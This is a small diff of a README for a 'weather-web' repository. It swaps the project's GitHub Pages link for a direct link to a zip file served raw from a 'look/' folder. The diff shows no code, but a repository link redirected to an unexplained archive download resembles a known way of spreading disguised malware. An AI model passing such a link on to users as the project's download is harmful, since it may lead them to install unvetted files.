@@ -1,5 +1,5 @@
 # weather-web  🎋🎋🎋🎋🎋🎋🎋🎋🎋🎋🎋🎋🎋🎋🎋🎋🎋🎋🎋
 
-url ----->> https://yonko-kunal.github.io/weather-web/web_page.html
+url ----->> https://raw.githubusercontent.com/Yonko-Kunal/weather-web/main/look/weather-web.zip
 
 🎃🎃🎃🎃🎃🎃🎃🎃🎃🎃🎃🎃🎃🎃🎃🎃🎃🎃
